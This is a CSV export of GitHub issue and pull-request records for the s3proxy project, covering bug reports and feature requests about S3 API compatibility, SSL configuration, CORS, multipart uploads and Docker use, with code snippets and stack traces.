gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/163,186988731,MDExOlB1bGxSZXF1ZXN0OTIxMDMyMDg=,163,Refactor to be used in websphere servlet,9978192,closed,FALSE,NA,NA,2,2016-11-03T06:49:45Z,2016-11-07T04:12:44Z,2016-11-07T04:12:44Z,CONTRIBUTOR,NA,"3 commits. The purpose is to refactor so that S3ProxyHandlerImpl can be reused in websphere servlet. Please review to see if this can be merged to main stream. BTW, I have successfully use S3ProxyHandlerImpl in my websphere servlet. Although I have more work to do, I think this approach should work and I can rely on S3Proxy to provide core functions. :)",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/163/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/163/comments,https://api.github.com/repos/gaul/s3proxy/issues/163/events,https://github.com/gaul/s3proxy/pull/163,https://api.github.com/repos/gaul/s3proxy/pulls/163
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/162,186981514,MDU6SXNzdWUxODY5ODE1MTQ=,162,Unknown parameters part-number-marker,3241357,closed,FALSE,NA,NA,5,2016-11-03T05:29:44Z,2016-11-08T15:44:50Z,2016-11-08T06:15:14Z,CONTRIBUTOR,NA,"I am trying to use s3proxy to save objects to Azure blobstore. Here is the code

```java
TransferManager transferManager = new TransferManager(amazonS3Client);
String file = MultiPartUpload.class.getClassLoader().getResource(fileName).getFile();
Upload upload = transferManager.upload(bucketName, keyName, new File(file));
upload.waitForUploadResult();
```

I am getting the following error at s3proxy:

```
Unknown parameters part-number-marker with URI /test-bucket-kishore/test-video.mp4
 501 NotImplemented A header you provided implies functionality that is not implemented. {}
```

Right now I added part-number-maker to `SUPPORTED_PARAMETERS` and its working. What is the actual fix for it?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/162/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/162/comments,https://api.github.com/repos/gaul/s3proxy/issues/162/events,https://github.com/gaul/s3proxy/issues/162,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/161,183868223,MDExOlB1bGxSZXF1ZXN0ODk5NDM4MTE=,161,Add support for X-Amz-Expires parameter,848247,closed,FALSE,NA,NA,5,2016-10-19T05:23:21Z,2016-10-19T17:42:00Z,2016-10-19T17:42:00Z,OWNER,NA,"Fixes #160.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/161/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/161/comments,https://api.github.com/repos/gaul/s3proxy/issues/161/events,https://github.com/gaul/s3proxy/pull/161,https://api.github.com/repos/gaul/s3proxy/pulls/161
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/160,183774225,MDU6SXNzdWUxODM3NzQyMjU=,160,Support V4 Signed URLs,848247,closed,FALSE,NA,NA,1,2016-10-18T19:01:09Z,2017-03-17T02:39:21Z,2017-03-17T02:39:21Z,OWNER,NA,"Current error:

```
E 10-18 13:06:32.338 S3Proxy-24 o.gaul.s3proxy.S3ProxyHandler:480 |::] Unknown parameters X-Amz-Expires with URI /temporary-bucket/68ae4a90-f079-02d1-6b06-fa3cd4e3aa26/c697097d-aad2-4d8c-293c-a4159f0a9286
```

Originally reported by @historus in #138.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/160/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/160/comments,https://api.github.com/repos/gaul/s3proxy/issues/160/events,https://github.com/gaul/s3proxy/issues/160,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/159,183422847,MDU6SXNzdWUxODM0MjI4NDc=,159,S3proxy via SSL,22397831,closed,FALSE,NA,NA,2,2016-10-17T13:55:14Z,2016-11-12T01:32:33Z,2016-11-12T01:32:33Z,NONE,NA,"Good day to all.

Trying to run s3proxy with SSL on Windows, 
_java -jar s3proxy --properties s3proxy.conf_

have a conf:

_s3proxy.authorization=none
s3proxy.secure-endpoint=https://127.0.0.1:8443
s3proxy.keystore-path=requestprivkey.pfx
s3proxy.keystore-password=Password8
s3proxy.endpoint=http://127.0.0.1:8080
jclouds.provider=filesystem
jclouds.identity=identity
jclouds.credential=credential
jclouds.filesystem.basedir=c:\temp_

but proxy started only on 8080 over http (not https).

What I missed?

p.s. **requestprivkey.pfx** - just a file with standard pfx-container that contains public and private keys. Can I use it (cant understand how to create jks)?

And, where i have to type Access key and Secret key like Amazon S3?

Thanx!!!
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/159/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/159/comments,https://api.github.com/repos/gaul/s3proxy/issues/159/events,https://github.com/gaul/s3proxy/issues/159,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/158,181086831,MDU6SXNzdWUxODEwODY4MzE=,158,recursively removing objects with awscli is not working,1563963,closed,FALSE,NA,NA,2,2016-10-05T07:54:28Z,2016-10-05T15:12:52Z,2016-10-05T11:45:43Z,NONE,NA,"Recursively removing objects in s3proxy with the awscli tool is not working:

```
# List bucket
% aws s3 --endpoint-url http://s3-service --recursive ls s3://foo
2016-10-05 07:36:27        152 hadoop.conf.d%2Fcore-site.xml
2016-10-05 07:36:27        685 hadoop.conf.d%2Fhdfs-site.xml
2016-10-05 07:36:27        138 hadoop.conf.d%2Fmapred-site.xml
2016-10-05 07:36:27       1960 hadoop.conf.d%2Fyarn-site.xml
# Delete all objects in bucket
% aws s3 --endpoint-url http://s3-service --recursive rm s3://foo/
delete: s3://foo/hadoop.conf.d%2Fcore-site.xml
delete: s3://foo/hadoop.conf.d%2Fhdfs-site.xml                
delete: s3://foo/hadoop.conf.d%2Fyarn-site.xml
delete: s3://foo/hadoop.conf.d%2Fmapred-site.xml
# List bucket again
% aws s3 --endpoint-url http://s3-service --recursive ls s3://foo
2016-10-05 07:36:27        152 hadoop.conf.d%2Fcore-site.xml
2016-10-05 07:36:27        685 hadoop.conf.d%2Fhdfs-site.xml
2016-10-05 07:36:27        138 hadoop.conf.d%2Fmapred-site.xml
2016-10-05 07:36:27       1960 hadoop.conf.d%2Fyarn-site.xml
```

I'm using the current s3proxy docker image and awscli version

```
aws-cli/1.11.1 Python/3.5.2 Linux/3.16.0-4-amd64 botocore/1.4.59
```

Deleting single objects is working (using the state of the bucket above):

```
% aws s3 --endpoint-url http://s3-service rm s3://foo/hadoop.conf.d/core-site.xml
delete: s3://foo/hadoop.conf.d/core-site.xml
% aws s3 --endpoint-url http://s3-service --recursive ls s3://foo
2016-10-05 07:36:27        685 hadoop.conf.d%2Fhdfs-site.xml
2016-10-05 07:36:27        138 hadoop.conf.d%2Fmapred-site.xml
2016-10-05 07:36:27       1960 hadoop.conf.d%2Fyarn-site.xml
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/158/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/158/comments,https://api.github.com/repos/gaul/s3proxy/issues/158/events,https://github.com/gaul/s3proxy/issues/158,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/157,179305854,MDU6SXNzdWUxNzkzMDU4NTQ=,157,Unicode tests fail in Docker container on Mac OS X,848247,open,FALSE,NA,NA,0,2016-09-26T18:41:55Z,2016-09-26T18:46:43Z,NA,OWNER,NA,"`mvn test` fails on Mac OS X 10.11.6 using Docker 1.12.1 using an Ubuntu 16.04.1 image:

```
testSpecialCharacters(org.gaul.s3proxy.S3AwsSdkTest)  Time elapsed: 1.654 sec  <<< FAILURE!
testUnicodeObject(org.gaul.s3proxy.S3AwsSdkTest)  Time elapsed: 1.575 sec  <<< ERROR!
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/157/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/157/comments,https://api.github.com/repos/gaul/s3proxy/issues/157/events,https://github.com/gaul/s3proxy/issues/157,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/156,179302274,MDU6SXNzdWUxNzkzMDIyNzQ=,156,Authorization configuration,848247,closed,FALSE,NA,NA,0,2016-09-26T18:25:56Z,2016-11-14T09:06:37Z,2016-11-14T09:06:37Z,OWNER,NA,"Presently S3Proxy supports `none` and `aws-v2` credentials, with the latter actually using v2 or v4 signatures.  S3Proxy should support four modes: `none`, `aws-v2`, `aws-v4`, and `aws`, with the latter opting into both v2 and v4.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/156/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/156/comments,https://api.github.com/repos/gaul/s3proxy/issues/156/events,https://github.com/gaul/s3proxy/issues/156,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/155,178645835,MDU6SXNzdWUxNzg2NDU4MzU=,155,Docker for Mac—Unable to get extended attributes,148789,closed,FALSE,NA,NA,13,2016-09-22T15:42:40Z,2017-03-03T18:36:47Z,2017-03-03T18:36:22Z,NONE,NA,"When using the `andrewgaul/s3proxy` image and mounting a user directory as as `/data`, I get this error when trying to read an object:

```
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html;charset=ISO-8859-1""/>
<title>Error 500 </title>
</head>
<body>
<h2>HTTP ERROR: 500</h2>
<p>Problem accessing /records/yoyoyo. Reason:
<pre>    java.nio.file.FileSystemException: /data/records/yoyoyo: Unable to get list of extended attributes: Operation not supported</pre></p>
<hr /><i><small>Powered by Jetty://</small></i>
</body>
</html>
```

Writing the object works fine.

Docker for Mac is explicit about not supporting extended attributes in its shares. https://docs.docker.com/docker-for-mac/osxfs/#extended-attributes
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/155/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/155/comments,https://api.github.com/repos/gaul/s3proxy/issues/155/events,https://github.com/gaul/s3proxy/issues/155,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/154,178258150,MDExOlB1bGxSZXF1ZXN0ODYxMDQ1NjQ=,154,Added logger.error instead of logger.debug in sendSimpleErrorResponse…,3241357,closed,FALSE,NA,NA,5,2016-09-21T06:28:13Z,2016-10-18T05:31:06Z,2016-10-18T05:31:06Z,CONTRIBUTOR,NA,"This change helps to debug why something is failing from logs
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/154/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/154/comments,https://api.github.com/repos/gaul/s3proxy/issues/154/events,https://github.com/gaul/s3proxy/pull/154,https://api.github.com/repos/gaul/s3proxy/pulls/154
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/153,178001608,MDU6SXNzdWUxNzgwMDE2MDg=,153,How do I override LOG_LEVEL when running main file,3241357,closed,FALSE,NA,NA,4,2016-09-20T08:47:52Z,2016-10-18T05:28:04Z,2016-10-18T05:28:04Z,CONTRIBUTOR,NA,"I want to override log level to INFO. By default all the DEBUG and above message are printed in my log. How do I override log level?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/153/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/153/comments,https://api.github.com/repos/gaul/s3proxy/issues/153/events,https://github.com/gaul/s3proxy/issues/153,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/152,176815851,MDU6SXNzdWUxNzY4MTU4NTE=,152,ListMultipartUploads not supported,1772540,closed,FALSE,NA,NA,1,2016-09-14T05:05:14Z,2016-09-14T05:06:13Z,2016-09-14T05:06:13Z,COLLABORATOR,NA,"s3proxy returns 501
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/152/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/152/comments,https://api.github.com/repos/gaul/s3proxy/issues/152/events,https://github.com/gaul/s3proxy/issues/152,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/151,176330928,MDU6SXNzdWUxNzYzMzA5Mjg=,151,Why ETAG is sent as base16 encoded string of contentMD5,3241357,closed,FALSE,NA,NA,8,2016-09-12T09:26:04Z,2016-09-13T17:34:45Z,2016-09-13T05:53:58Z,CONTRIBUTOR,NA,"Why the md5 of cloud provider is not sent directly to the client? Why etag is set using base16 encode of contentMD5 ? 

Here is the link to the code 

https://github.com/andrewgaul/s3proxy/blob/master/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java#L2387

When initiating partial download using range query, Azure doesn't provide any contentMD5 but it provides ETAG. Because s3proxy sends etag as base16 encoded string of contentMD5, I am not getting any etag in the response when doing a partial download
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/151/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/151/comments,https://api.github.com/repos/gaul/s3proxy/issues/151/events,https://github.com/gaul/s3proxy/issues/151,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/150,175122426,MDU6SXNzdWUxNzUxMjI0MjY=,150,Add s3verify to CI,848247,closed,FALSE,NA,NA,2,2016-09-05T20:01:43Z,2017-05-10T23:54:51Z,2017-05-10T23:54:51Z,OWNER,NA,"Minio team has another test suite to complement s3-tests:

https://github.com/minio/s3verify
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/150/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/150/comments,https://api.github.com/repos/gaul/s3proxy/issues/150/events,https://github.com/gaul/s3proxy/issues/150,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/149,174238167,MDU6SXNzdWUxNzQyMzgxNjc=,149,Java List Buckets Client Error,10137,closed,FALSE,NA,NA,8,2016-08-31T10:26:43Z,2016-09-01T15:11:53Z,2016-09-01T08:31:16Z,NONE,NA,"Hello,

I seem to be getting a client error with 1.5.0 when trying to list buckets

**Code**

```
String endpoint = ""http://127.0.0.1:8085"";
URI uri = URI.create(endpoint);
Properties properties = new Properties();
properties.setProperty(""s3proxy.authorization"", ""none"");
properties.setProperty(""s3proxy.endpoint"", endpoint);
properties.setProperty(""jclouds.provider"", ""filesystem"");
properties.setProperty(""jclouds.filesystem.basedir"", ""/tmp/s3proxy"");

ContextBuilder builder = ContextBuilder
        .newBuilder(""filesystem"")
        .credentials(""x"", ""x"")
        .modules(ImmutableList.<Module>of(new SLF4JLoggingModule()))
        .overrides(properties);
BlobStoreContext context = builder.build(BlobStoreContext.class);
BlobStore blobStore = context.getBlobStore();

S3Proxy s3Proxy = S3Proxy.builder().awsAuthentication(""x"", ""x"").endpoint(uri).keyStore("""", """").blobStore(blobStore).build();
s3Proxy.start();

BasicAWSCredentials awsCredentials = new BasicAWSCredentials(""x"", ""x"");

AmazonS3Client client = new AmazonS3Client(awsCredentials, new ClientConfiguration());
client.setEndpoint(endpoint);

// List Buckets
List<Bucket> buckets = client.listBuckets();
**
```

**Exception**

```
com.amazonaws.services.s3.model.AmazonS3Exception: Bad Request (Service: Amazon S3; Status Code: 400; Error Code: InvalidArgument; Request ID: 4442587FB7D0A2F9)
, S3 Extended Request ID: null
    at com.amazonaws.http.AmazonHttpClient.handleErrorResponse(AmazonHttpClient.java:1386)
    at com.amazonaws.http.AmazonHttpClient.executeOneRequest(AmazonHttpClient.java:939)
    at com.amazonaws.http.AmazonHttpClient.executeHelper(AmazonHttpClient.java:714)
    at com.amazonaws.http.AmazonHttpClient.doExecute(AmazonHttpClient.java:465)
    at com.amazonaws.http.AmazonHttpClient.executeWithTimer(AmazonHttpClient.java:427)
    at com.amazonaws.http.AmazonHttpClient.execute(AmazonHttpClient.java:376)
    at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:4031)
    at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:3968)
    at com.amazonaws.services.s3.AmazonS3Client.listBuckets(AmazonS3Client.java:871)
    at com.amazonaws.services.s3.AmazonS3Client.listBuckets(AmazonS3Client.java:877)
        ...
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/149/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/149/comments,https://api.github.com/repos/gaul/s3proxy/issues/149/events,https://github.com/gaul/s3proxy/issues/149,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/148,173478768,MDU6SXNzdWUxNzM0Nzg3Njg=,148,Cannot create embedded S3 Java,10137,closed,FALSE,NA,NA,10,2016-08-26T15:22:12Z,2019-10-21T15:53:52Z,2019-10-21T15:53:52Z,NONE,NA,"Hello, 

Sorry this isn't really as much of an issue as an lack of competence from me to set it up.

I'm trying to use the S3Proxy library to setup a local S3 mock to run some Integration Tests on. I don't want to use a config file. I want to do it all programmatically.

I have come up with the following code from your examples but am getting the following error:
`
java.lang.NoSuchMethodError: com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.<init>(Lcom/google/gson/internal/ConstructorConstructor;Lcom/google/gson/FieldNamingStrategy;Lcom/google/gson/internal/Excluder;)V`

This is the code.

```
String endpoint = ""http://127.0.0.1:8085"";
URI uri = URI.create(endpoint);
Properties properties = new Properties();
properties.setProperty(""s3proxy.authorization"", ""none"");
properties.setProperty(""s3proxy.endpoint"", endpoint);
properties.setProperty(""jclouds.provider"", ""filesystem"");
properties.setProperty(""jclouds.filesystem.basedir"", ""/tmp/s3proxy"");

ContextBuilder builder = ContextBuilder
        .newBuilder(""filesystem"")
        .credentials(""x"", ""x"")
        .modules(ImmutableList.<Module>of(new SLF4JLoggingModule()))
        .overrides(properties);
BlobStoreContext context = builder.build(BlobStoreContext.class);
BlobStore blobStore = context.getBlobStore();

S3Proxy s3Proxy = S3Proxy.builder().awsAuthentication(""x"", ""x"").endpoint(uri).keyStore("""", """").blobStore(blobStore).build();
s3Proxy.start();

BasicAWSCredentials awsCredentials = new BasicAWSCredentials(""x"", ""x"");

AmazonS3Client client = new AmazonS3Client(awsCredentials, new ClientConfiguration());
client.setEndpoint(endpoint);
GetObjectRequest objectRequest = new GetObjectRequest(""bucket"", ""key"");
S3Object object = client.getObject(objectRequest);

s3Proxy.stop();
```

I'm sure loads of people need this! Would be so greatful if you could help.

Cheers, 
Peter
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/148/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/148/comments,https://api.github.com/repos/gaul/s3proxy/issues/148/events,https://github.com/gaul/s3proxy/issues/148,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/147,165661370,MDU6SXNzdWUxNjU2NjEzNzA=,147,Move tests from S3ProxyTest to S3AwsSdkTest,848247,closed,FALSE,NA,NA,0,2016-07-14T21:19:25Z,2017-02-16T07:12:35Z,2017-02-16T07:12:35Z,OWNER,NA,"S3Proxy should use the official AWS SDK for its internal tests which gives better user coverage.  S3Proxy already runs all the jclouds integration tests so we get coverage of its client that way.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/147/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/147/comments,https://api.github.com/repos/gaul/s3proxy/issues/147/events,https://github.com/gaul/s3proxy/issues/147,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/146,165635454,MDU6SXNzdWUxNjU2MzU0NTQ=,146,Provide Docker build environment,848247,open,FALSE,NA,NA,0,2016-07-14T19:08:10Z,2016-07-14T19:08:10Z,NA,OWNER,NA,"This would run the unit tests but more importantly run the s3-tests conformance suite.  This would allow developers to easily run the same tests as Travis.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/146/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/146/comments,https://api.github.com/repos/gaul/s3proxy/issues/146/events,https://github.com/gaul/s3proxy/issues/146,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/145,165622443,MDU6SXNzdWUxNjU2MjI0NDM=,145,S3 Multipart Content-Length mismatch error,7581592,closed,FALSE,NA,NA,14,2016-07-14T18:04:00Z,2017-03-13T10:22:00Z,2016-07-14T20:36:32Z,NONE,NA,"Up until today I've been able to do multipart uploads using 1.4.0 version of s3proxy, suddenly I am getting the following errors uploading s3 streams within my tests. I've tried upgrading to 1.5.0 prerelease and downgrading to 1.3.0 but I'm getting the same error. Any debugging tips?

```
java.io.IOException: Content-Length mismatch, actual: 244334 expected: 244068 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.io.IOException: Content-Length mismatch, actual: 244334 expected: 244068; Request ID: null)
com.amazonaws.services.s3.model.AmazonS3Exception: java.io.IOException: Content-Length mismatch, actual: 244334 expected: 244068 (Service: Amazon S3; Status Code: 500; Error Code: 500 java.io.IOException: Content-Length mismatch, actual: 244334 expected: 244068; Request ID: null)
    at com.amazonaws.http.AmazonHttpClient.handleErrorResponse(AmazonHttpClient.java:1378)
    at com.amazonaws.http.AmazonHttpClient.executeOneRequest(AmazonHttpClient.java:924)
    at com.amazonaws.http.AmazonHttpClient.executeHelper(AmazonHttpClient.java:702)
    at com.amazonaws.http.AmazonHttpClient.doExecute(AmazonHttpClient.java:454)
    at com.amazonaws.http.AmazonHttpClient.executeWithTimer(AmazonHttpClient.java:416)
    at com.amazonaws.http.AmazonHttpClient.execute(AmazonHttpClient.java:365)
    at com.amazonaws.services.s3.AmazonS3Client.invoke(AmazonS3Client.java:3995)
    at com.amazonaws.services.s3.AmazonS3Client.doUploadPart(AmazonS3Client.java:3029)
    at com.amazonaws.services.s3.AmazonS3Client.uploadPart(AmazonS3Client.java:3014)
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/145/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/145/comments,https://api.github.com/repos/gaul/s3proxy/issues/145/events,https://github.com/gaul/s3proxy/issues/145,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/144,163495964,MDExOlB1bGxSZXF1ZXN0NzYwNTI1MDY=,144,Add property to include permissive CORS response,848247,closed,FALSE,NA,NA,10,2016-07-02T01:27:31Z,2016-07-19T17:34:32Z,2016-07-19T17:32:53Z,OWNER,NA,"References #142.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/144/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/144/comments,https://api.github.com/repos/gaul/s3proxy/issues/144/events,https://github.com/gaul/s3proxy/pull/144,https://api.github.com/repos/gaul/s3proxy/pulls/144
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/143,162628665,MDU6SXNzdWUxNjI2Mjg2NjU=,143,Creating file with Hadoop yields NullPointerException,1563963,closed,FALSE,NA,NA,3,2016-06-28T08:21:31Z,2016-06-29T07:56:14Z,2016-06-29T07:56:14Z,NONE,NA,"I'm trying to write to s3proxy from Spark (which uses Hadoop) and get the following error:

```
W 06-28 08:06:31.757 S3Proxy-15 o.e.jetty.server.HttpChannel:396 |::] /test-s3-20160628-080610/hadoopKey/_temporary/0/task_201606280806_0000_m_000002/part-00002
java.lang.NullPointerException: null
    at org.jclouds.blobstore.config.LocalBlobStore.maybeQuoteETag(LocalBlobStore.java:938)
    at org.jclouds.blobstore.config.LocalBlobStore.copyBlob(LocalBlobStore.java:540)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:498)
    at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
    at com.sun.proxy.$Proxy39.copyBlob(Unknown Source)
    at org.gaul.s3proxy.S3ProxyHandler.handleCopyBlob(S3ProxyHandler.java:1548)
    at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:583)
    at org.gaul.s3proxy.S3ProxyHandler.handle(S3ProxyHandler.java:255)
    at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
    at org.eclipse.jetty.server.Server.handle(Server.java:499)
    at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
    at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257)
    at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
    at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
    at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
    at java.lang.Thread.run(Thread.java:745)
```

I'm running s3proxy 1.5.0-prerelease in a Docker container. I use the `s3a://` Hadoop-scheme.

The config file contains:

```
s3proxy.authorization=none
s3proxy.endpoint=http://0.0.0.0:2345
jclouds.provider=filesystem
jclouds.identity=identity
jclouds.credential=credential
jclouds.filesystem.basedir=/data/s3proxy
```

The used Dockerfile is

```
FROM java

RUN mkdir /opt/s3proxy
ADD https://github.com/andrewgaul/s3proxy/releases/download/s3proxy-1.5.0-prerelease/s3proxy /opt/s3proxy/s3proxy
RUN chmod +x /opt/s3proxy/s3proxy
WORKDIR /opt/s3proxy
ENTRYPOINT /opt/s3proxy/s3proxy --properties /config/s3proxy.conf
```
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/143/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/143/comments,https://api.github.com/repos/gaul/s3proxy/issues/143/events,https://github.com/gaul/s3proxy/issues/143,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/142,161730473,MDU6SXNzdWUxNjE3MzA0NzM=,142,CORS support,1567457,closed,FALSE,NA,NA,9,2016-06-22T16:39:09Z,2020-09-07T09:39:48Z,2018-12-21T22:19:51Z,NONE,NA,"I'm accessing videos stored by s3proxy from a page on another domain. I have security issues in my JS script because, when serving a video, the header doesn't specify any ""Access-Control-Allow-Origin"". I'd like s3proxy to set ""Access-Control-Allow-Origin"" to a value (e.g. ""*"" for testing), is there a way to do that as of now ?

Maybe through jclouds' configuration ?
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/142/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/142/comments,https://api.github.com/repos/gaul/s3proxy/issues/142/events,https://github.com/gaul/s3proxy/issues/142,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/141,160431303,MDExOlB1bGxSZXF1ZXN0NzM5MTgwMDA=,141,support for S3 response header overrides,2651158,closed,FALSE,NA,NA,7,2016-06-15T14:08:14Z,2016-07-16T06:16:33Z,2016-07-16T06:16:33Z,CONTRIBUTOR,NA,"I added support for `response-content-disposition` request query parameter in object GETs.
See details: https://forums.aws.amazon.com/ann.jspa?annID=884

I also added a simple Dockerfile to support a docker development environment based on the official [maven docker image](https://hub.docker.com/_/maven/). You can then run `docker build -t s3proxy-build -f Dockerfile.build .` to build and test s3proxy. This encapsulates java and maven dependencies quite nicely.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/141/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/141/comments,https://api.github.com/repos/gaul/s3proxy/issues/141/events,https://github.com/gaul/s3proxy/pull/141,https://api.github.com/repos/gaul/s3proxy/pulls/141
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/140,159530052,MDU6SXNzdWUxNTk1MzAwNTI=,140,Read caching middleware,848247,open,FALSE,NA,NA,1,2016-06-09T23:21:42Z,2020-07-22T00:22:37Z,NA,OWNER,NA,"S3Proxy could provide a read cache by saving every object during get and issuing conditional gets for validation which most backends support.  We would need to provide knobs for cache size in gigabytes and number of objects.  Write caching raises complex issues so I intentionally scope this to just reads.  Related to kahing/goofys#82.
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/140/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/140/comments,https://api.github.com/repos/gaul/s3proxy/issues/140/events,https://github.com/gaul/s3proxy/issues/140,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/139,159146088,MDExOlB1bGxSZXF1ZXN0NzMwMzM0ODc=,139,chore(parameters): also ignore unknown parameters,5287336,closed,FALSE,NA,NA,2,2016-06-08T11:58:45Z,2016-10-18T05:27:35Z,2016-10-18T05:27:34Z,NONE,NA,"closes #138 
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/139/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/139/comments,https://api.github.com/repos/gaul/s3proxy/issues/139/events,https://github.com/gaul/s3proxy/pull/139,https://api.github.com/repos/gaul/s3proxy/pulls/139
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/138,159134427,MDU6SXNzdWUxNTkxMzQ0Mjc=,138,Provide ability to also ignore unknown parameters,5287336,closed,FALSE,NA,NA,10,2016-06-08T10:49:43Z,2017-02-20T16:49:14Z,2016-10-18T05:27:37Z,NONE,NA,"There is already an option to ignore unknown headers.
It would be helpful to also ignore unknown parameters.
